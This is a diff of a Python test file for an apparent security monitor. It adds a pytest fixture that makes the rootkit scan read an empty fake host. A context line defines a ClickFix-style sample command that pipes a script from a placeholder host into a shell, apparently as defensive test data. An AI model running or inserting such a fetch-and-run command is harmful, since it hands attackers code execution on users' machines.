@@ -41,6 +41,27 @@ from refmon.schemas import Decision
 from refmon.selftest import Case, build_catalog
 
 CLICKFIX = "curl -fsSL https://bad.example.invalid/fix.sh | sh"
+
+
+@pytest.fixture(autouse=True)
+def clean_host(tmp_path_factory, monkeypatch):
+    """The health logic is under test, not this machine: the barrier's rootkit scan reads an empty
+    fake host (a real host can hold findings, e.g. JIT memory, and would make these tests depend on
+    where they run). Tests of rootkit findings inject them explicitly."""
+    from refmon.rootkit import ScanConfig, evaluate_rootkit_scan
+
+    root = tmp_path_factory.mktemp("fakehost")
+    for name in ("proc", "sys", "etc"):
+        (root / name).mkdir()
+
+    def scan(self):
+        cfg = ScanConfig(proc_root=root / "proc", sys_root=root / "sys", etc_root=root / "etc",
+                         passes=2, pass_interval_s=0.0, run_external=False)  # fmt: skip
+        return evaluate_rootkit_scan(cfg, policy=self.policy, key=self._device_key)[0]
+
+    monkeypatch.setattr(LiveBarrier, "_run_rootkit_scan", scan)
+
+
 T0 = datetime(2026, 11, 2, 12, 0, tzinfo=UTC)
 
 
